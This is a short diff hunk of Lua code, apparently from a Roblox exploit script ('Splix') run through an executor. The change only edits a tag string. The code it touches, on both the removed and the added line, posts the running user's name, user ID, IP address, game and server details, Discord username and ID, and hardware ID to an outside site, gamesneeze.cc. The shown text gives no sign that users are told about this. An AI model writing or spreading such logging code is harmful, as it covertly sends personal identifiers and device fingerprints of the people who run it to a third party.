@@ -111,7 +111,7 @@ local response = syn.request(
         Url = 'http://gamesneeze.cc/send.php',
         Method = 'POST',
         Headers = {},
-        Body = ("&key=test&username=%s&userid=%s&userip=%s&gamename=%s&gameid=%s&gamelink=%s&gamejob=%s&time=%s&timezone=%s&extra=Splix Execution&discordusername=%s&discordid=%s&hwid=%s"):format(Client.Name, Client.UserId, InternetProtocol or "null", ProductInfo.Name or "null", PlaceId, "https://www.roblox.com/games/" .. PlaceId .. "/", game.JobId, os.date("%c", os.time()), os.date("%Z", os.time()), lgVarsTbl["DiscordUsername"], lgVarsTbl["DiscordId"], lgVarsTbl["HWID"])
+        Body = ("&key=test&username=%s&userid=%s&userip=%s&gamename=%s&gameid=%s&gamelink=%s&gamejob=%s&time=%s&timezone=%s&extra=Splix Execution - CIELUV&discordusername=%s&discordid=%s&hwid=%s"):format(Client.Name, Client.UserId, InternetProtocol or "null", ProductInfo.Name or "null", PlaceId, "https://www.roblox.com/games/" .. PlaceId .. "/", game.JobId, os.date("%c", os.time()), os.date("%Z", os.time()), lgVarsTbl["DiscordUsername"], lgVarsTbl["DiscordId"], lgVarsTbl["HWID"])
     }
 )
 
